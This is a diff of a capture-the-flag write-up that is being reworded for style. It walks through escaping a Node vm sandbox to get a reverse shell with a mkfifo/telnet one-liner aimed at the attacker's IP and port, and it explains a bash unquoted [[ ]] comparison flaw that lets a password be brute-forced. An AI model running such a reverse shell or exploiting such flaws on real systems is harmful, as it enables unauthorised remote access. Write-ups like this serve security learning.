@@ -55,10 +55,6 @@ try {
 console.log(vm.run(code));
 ```
 
-Then I changed the `execSync` parameter to get a reverse shell so I opened a netcat session and tried some types found at [revshell](https://www.revshells.com/). After a few tries getting error I got the shell with this one `TF=$(mktemp -u);mkfifo $TF && telnet <my_ip> <my_port> 0<$TF | bash 1>$TF`.
-
-! Tried some commands to see a few things, everything working fine. So, I upgraded my terminal — I already show some methods in previous write-ups. 
-
 Next, I modified the `execSync` parameter to obtain a reverse shell. I opened a netcat session and attempted various types found at [revshell](https://www.revshells.com/). After a few attempts resulting in errors, I successfully obtained a shell with the following command: `TF=$(mktemp -u);mkfifo $TF && telnet <my_ip> <my_port> 0<$TF | bash 1>$TF`.
 
 Gotcha, I’m in! I tested a few commands to verify everything was working fine. Subsequently, I upgraded my terminal—I've already shared some methods in previous write-ups.
@@ -103,9 +99,9 @@ So I opened the script to see what it does.
 
 It doesn’t seems to do anything wrong. Here I tried to run some of those lines to see if it has anything interesting — I got stuck in this step for some hours, no way this is a easy machine from now on.
 
-A friend of mine told me that the problem was in the line `if [[ $DB_PASS == $USER_PASS ]];`. Looks like if this comparison with double square brackets `[[` doesn’t have quotes in the right-hand side, bash does pattern matching instead of treating it as a string.  It means that if you put a `*` when you check the password it will always be True, because `*` matches any string.
+A friend of mine pointed out that the issue lay in the line `if [[ $DB_PASS == $USER_PASS ]];`. It appears that when comparing without quotes in the right-hand side using double square brackets **`[[`**, Bash performs pattern matching instead of treating it as a string. This means that if you include a **`*`** when checking the password, it will always be considered True because **`*`** matches any string.
 
-So the correct way to do it would be `if [[ $DB_PASS == "$USER_PASS" ]];` . If you didn’t get how it works you can check out in [this wiki](https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29). He told me that he had a script that could try to bruteforce the password due to this flaw. I didn’t wrote it, so I’ll not try to explain it but if you know basics about programming you can take a few minutes to understand how it work as homework, it’s pretty simple.
+To correct this, the comparison should be written as `if [[ $DB_PASS == "$USER_PASS" ]];`. If you're unfamiliar with how this works, you can check out [this wiki](https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29). My friend mentioned that he had a script capable of brute-forcing the password due to this flaw. Although I won't explain it, I encourage you to take a few minutes to understand how it works as homework; it's quite straightforward if you have basic programming knowledge.
 
 ```bash
 import string
